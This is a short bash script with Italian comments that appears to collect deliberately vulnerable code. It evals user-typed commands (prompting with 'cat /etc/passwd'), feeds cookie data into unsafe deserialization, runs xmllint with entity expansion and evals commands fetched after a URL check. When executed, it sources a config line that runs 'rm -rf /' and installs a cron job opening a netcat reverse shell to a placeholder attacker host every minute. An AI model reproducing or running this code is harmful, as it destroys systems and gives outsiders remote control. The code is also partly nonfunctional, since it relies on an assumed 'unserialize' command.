#!/bin/bash


echo "Inserisci un comando e un percorso (es. ls; cat /etc/passwd):"
read input
IFS=';' read -ra COMMANDS <<< "$input"
for cmd in "${COMMANDS[@]}"; do
  eval "$cmd"
done


COOKIE=$(curl -s --cookie-jar - --cookie "$COOKIE_NAME=$COOKIE_VALUE" "$URL")
OBJECT=$(echo "$COOKIE" | grep -oP "(?<=serialized=)[^;]+")
if [[ -n "$OBJECT" ]]; then
  echo "$OBJECT" | base64 -d | unserialize # Supponiamo esista un comando "unserialize"
fi


echo "Inserisci un URL:"
read URL
RESPONSE=$(curl -s "$URL")
if [[ "$RESPONSE" == *"vulnerable"* ]]; then
  echo "URL vulnerabile, esecuzione comando:"
  read COMMAND
  eval "$COMMAND"
fi


LOG_FILE="/tmp/access.log"
echo "$(date) - Accesso da $REMOTE_ADDR" >> "$LOG_FILE"
sleep 1 # Simulazione di un ritardo
if [[ -s "$LOG_FILE" ]]; then
  cat "$LOG_FILE"
  rm "$LOG_FILE"
fi


export CONFIG_FILE="/tmp/config.ini"
echo "option1=value1" > "$CONFIG_FILE"
echo "option2=$(echo 'vulnerable; rm -rf /')" >> "$CONFIG_FILE"
source "$CONFIG_FILE"
echo "$option2" # Esecuzione del comando dannoso


echo "Inserisci un documento XML:"
read XML_INPUT
echo "$XML_INPUT" | xmllint --noent --dtdvalid - # Supponiamo xmllint sia installato

# Vulnerabilità di Iniezione di Comandi tramite Cronjob (CVSS 3.1: 10.0 - Critico)
echo "* * * * * $(echo 'vulnerable; nc -e /bin/bash attacker_ip attacker_port')" > /tmp/cronjob
crontab /tmp/cronjob
